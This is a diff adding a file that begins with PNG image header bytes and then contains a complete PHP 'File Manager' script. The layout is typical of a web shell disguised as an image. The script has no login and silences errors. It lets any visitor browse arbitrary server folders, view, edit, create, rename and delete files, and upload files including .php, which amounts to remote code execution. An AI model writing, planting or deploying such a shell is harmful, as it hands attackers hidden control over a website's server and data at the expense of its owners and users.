@@ -1,0 +1,403 @@
+âPNG
+
+   IHDR  2   Â   –ä{Ê   sRGB ÆŒÈ   gAMA  ±è¸a   	pHYs  √  √«o®d  IDATx^Ì‘A  ¿0¿≈˘
+,iü∞=3wÑù? ‘êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyF‰êgd@ûëyòQWçU    IENDÆB`Ç
+
+<!--QWjxYnWn-->
+<!--QWjxYnWn-->
+<?php
+// ========================
+// INITIAL SETTINGS
+// ========================
+error_reporting(0);
+session_start();
+
+$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'txt', 'pdf', 'zip', 
+                      'php', 'html', 'css', 'js', 'json', 'sql'];
+
+// ========================
+// PATH HANDLING
+// ========================
+$current_folder = getcwd();
+if(isset($_GET['folder']) && is_dir($_GET['folder'])) {
+    $current_folder = realpath($_GET['folder']);
+}
+
+$file_name = isset($_GET['file']) ? basename($_GET['file']) : '';
+$file_path = $current_folder . '/' . $file_name;
+
+// ========================
+// FUNCTION LIBRARY
+// ========================
+
+// Show folder contents
+function show_folder($path) {
+    echo "<table border='1' cellpadding='5' cellspacing='0' width='100%'>
+            <tr bgcolor='#e0e0e0'>
+                <th>Name</th>
+                <th width='80'>Size</th>
+                <th width='120'>Modified</th>
+                <th width='200'>Actions</th>
+            </tr>";
+    
+    // Go to parent folder
+    echo "<tr>
+            <td colspan='4'>
+                <a href='?folder=" . urlencode(dirname($path)) . "'>
+                    [ GO TO PARENT FOLDER ]
+                </a>
+            </td>
+          </tr>";
+    
+    $items = array_diff(scandir($path), ['.', '..']);
+    
+    foreach($items as $item) {
+        $full_path = $path . '/' . $item;
+        $is_folder = is_dir($full_path);
+        $icon = $is_folder ? '??' : '??';
+        $size = $is_folder ? '-' : format_size(filesize($full_path));
+        $date = date('d.m.Y H:i', filemtime($full_path));
+        
+        echo "<tr>";
+        
+        // Name
+        echo "<td>$icon ";
+        if($is_folder) {
+            echo "<a href='?folder=" . urlencode($full_path) . "'><b>$item</b></a>";
+        } else {
+            echo "<b>$item</b>";
+        }
+        echo "</td>";
+        
+        // Size
+        echo "<td align='right'>$size</td>";
+        
+        // Date
+        echo "<td>$date</td>";
+        
+        // Actions
+        echo "<td>";
+        if(!$is_folder) {
+            echo "[<a href='?folder=" . urlencode($path) . "&action=edit&file=$item'>Edit</a>] ";
+            echo "[<a href='?folder=" . urlencode($path) . "&action=view&file=$item'>View</a>] ";
+        }
+        echo "[<a href='?folder=" . urlencode($path) . "&action=rename&file=$item'>Rename</a>] ";
+        echo "[<a href='?folder=" . urlencode($path) . "&action=delete&file=$item' 
+              onclick=\"return confirm('Delete $item?')\">Delete</a>]";
+        echo "</td>";
+        
+        echo "</tr>";
+    }
+    
+    echo "</table>";
+}
+
+// Format size
+function format_size($bytes) {
+    if($bytes < 1024) return $bytes . ' B';
+    if($bytes < 1048576) return round($bytes/1024, 2) . ' KB';
+    return round($bytes/1048576, 2) . ' MB';
+}
+
+// Upload file
+function upload_file($target) {
+    global $allowed_extensions;
+    
+    $file = $_FILES['upload_file'];
+    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
+    
+    if(!in_array($extension, $allowed_extensions)) {
+        return "ERROR: .$extension extension not allowed";
+    }
+    
+    if(move_uploaded_file($file['tmp_name'], $target . '/' . $file['name'])) {
+        return "OK: " . $file['name'] . " uploaded";
+    }
+    
+    return "ERROR: Upload failed";
+}
+
+// Create folder
+function create_folder($path) {
+    $name = trim($_POST['new_folder']);
+    if(empty($name)) return "ERROR: Folder name required";
+    
+    $new_path = $path . '/' . $name;
+    
+    if(mkdir($new_path)) {
+        return "OK: $name folder created";
+    }
+    
+    return "ERROR: Folder creation failed";
+}
+
+// Create file
+function create_file($path) {
+    $name = trim($_POST['new_file']);
+    $content = $_POST['file_content'] ?? '';
+    
+    if(empty($name)) return "ERROR: File name required";
+    
+    $new_path = $path . '/' . $name;
+    
+    if(file_put_contents($new_path, $content) !== false) {
+        return "OK: $name file created";
+    }
+    
+    return "ERROR: File creation failed";
+}
+
+// Edit file
+function edit_file($path) {
+    if($_SERVER['REQUEST_METHOD'] == 'POST') {
+        file_put_contents($path, $_POST['content']);
+        echo "<div style='background:#d4edda; padding:10px; margin:10px 0;'>
+                File saved
+              </div>";
+    }
+    
+    $content = htmlspecialchars(file_get_contents($path));
+    $name = basename($path);
+    
+    echo "<h3>Edit: $name</h3>
+          <form method='POST'>
+            <textarea name='content' rows='25' style='width:100%; font-family:monospace;'>$content</textarea>
+            <br><br>
+            <input type='submit' value='Save'>
+            <input type='button' value='Cancel' onclick=\"window.location='?folder=" . urlencode(dirname($path)) . "'\">
+          </form>";
+}
+
+// View file
+function view_file($path) {
+    $content = htmlspecialchars(file_get_contents($path));
+    $name = basename($path);
+    
+    echo "<h3>View: $name</h3>
+          <div style='border:1px solid #ccc; padding:10px; background:#f8f9fa;'>
+            <pre style='white-space:pre-wrap;'>$content</pre>
+          </div>
+          <br>
+          <a href='?folder=" . urlencode(dirname($path)) . "'>Go Back</a>";
+}
+
+// Delete
+function delete_item($path) {
+    if(is_dir($path)) {
+        rmdir($path);
+        return "OK: Folder deleted";
+    } else {
+        unlink($path);
+        return "OK: File deleted";
+    }
+}
+
+// Rename
+function rename_item($path) {
+    if($_SERVER['REQUEST_METHOD'] == 'POST') {
+        $new_name = trim($_POST['new_name']);
+        $new_path = dirname($path) . '/' . $new_name;
+        
+        if(rename($path, $new_path)) {
+            echo "<script>window.location='?folder=" . urlencode(dirname($path)) . "'</script>";
+            return;
+        }
+    }
+    
+    $current_name = basename($path);
+    
+    echo "<h3>Rename: $current_name</h3>
+          <form method='POST'>
+            <input type='text' name='new_name' value='$current_name' size='50'>
+            <input type='submit' value='Rename'>
+            <input type='button' value='Cancel' onclick=\"window.location='?folder=" . urlencode(dirname($path)) . "'\">
+          </form>";
+}
+
+// ========================
+// ACTION HANDLER
+// ========================
+$message = '';
+$special_action = false;
+
+// POST actions
+if($_SERVER['REQUEST_METHOD'] == 'POST') {
+    if(isset($_FILES['upload_file'])) {
+        $message = upload_file($current_folder);
+    }
+    elseif(isset($_POST['new_folder'])) {
+        $message = create_folder($current_folder);
+    }
+    elseif(isset($_POST['new_file'])) {
+        $message = create_file($current_folder);
+    }
+}
+
+// GET actions
+$action = $_GET['action'] ?? '';
+if($action && $file_name) {
+    $special_action = true;
+    
+    switch($action) {
+        case 'edit':
+            edit_file($file_path);
+            break;
+        case 'view':
+            view_file($file_path);
+            break;
+        case 'delete':
+            $message = delete_item($file_path);
+            break;
+        case 'rename':
+            rename_item($file_path);
+            break;
+    }
+}
+
+// ========================
+// INTERFACE
+// ========================
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>File Manager</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background: #f0f0f0;
+        }
+        
+        .box {
+            background: white;
+            border: 1px solid #ccc;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 5px;
+        }
+        
+        .message {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 3px;
+        }
+        
+        .ok { background: #d4edda; color: #155724; }
+        .error { background: #f8d7da; color: #721c24; }
+        
+        input[type="text"], input[type="file"], textarea {
+            padding: 5px;
+            margin: 3px 0;
+            width: 300px;
+        }
+        
+        input[type="submit"], button {
+            padding: 6px 12px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        
+        input[type="submit"]:hover, button:hover {
+            background: #45a049;
+        }
+        
+        table {
+            background: white;
+            border-collapse: collapse;
+        }
+        
+        th {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        tr:hover {
+            background: #f5f5f5;
+        }
+        
+        .actions {
+            margin: 20px 0;
+        }
+        
+        .actions div {
+            display: inline-block;
+            vertical-align: top;
+            margin-right: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<h2>?? File Manager</h2>
+
+<?php if($message): ?>
+    <div class="message <?php echo strpos($message, 'OK:') === 0 ? 'ok' : 'error'; ?>">
+        <?php echo htmlspecialchars($message); ?>
+    </div>
+<?php endif; ?>
+
+<?php if($special_action): ?>
+    <!-- Special action view (edit, view, etc) -->
+    <div class="box">
+        <a href="?folder=<?php echo urlencode($current_folder); ?>">? Back to List</a>
+        <hr>
+        <?php /* Content already written by functions */ ?>
+    </div>
+<?php else: ?>
+    <!-- Normal folder view -->
+    
+    <!-- Header info -->
+    <div class="box">
+        <strong>Folder:</strong> <?php echo htmlspecialchars($current_folder); ?><br>
+        <strong>Total:</strong> <?php echo count(array_diff(scandir($current_folder), ['.', '..'])); ?> items
+    </div>
+    
+    <!-- Action forms -->
+    <div class="actions">
+        <div class="box">
+            <h4>?? Upload File</h4>
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="upload_file" required><br><br>
+                Allowed extensions: <?php echo implode(', ', $allowed_extensions); ?><br><br>
+                <input type="submit" value="Upload">
+            </form>
+        </div>
+        
+        <div class="box">
+            <h4>?? New Folder</h4>
+            <form method="POST">
+                <input type="text" name="new_folder" placeholder="folder_name" required><br><br>
+                <input type="submit" value="Create">
+            </form>
+        </div>
+        
+        <div class="box">
+            <h4>?? New File</h4>
+            <form method="POST">
+                <input type="text" name="new_file" placeholder="file.txt" required><br>
+                <textarea name="file_content" placeholder="Content..." rows="4"></textarea><br>
+                <input type="submit" value="Create">
+            </form>
+        </div>
+    </div>
+    
+    <!-- Folder listing -->
+    <div class="box">
+        <?php show_folder($current_folder); ?>
+    </div>
+    
+    <!-- Footer info -->
+    <div class="box" style="text-align:center; font-size:12px; color:#666;">
+        PHP <?php echo phpversion(); ?> | 
+        Memory: <?php echo round(memory_get_usage()/1024/1024, 2); ?> MB | 
+        Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?>
+    </div>
+<?php endif; ?>
+
+</body>
+</html>
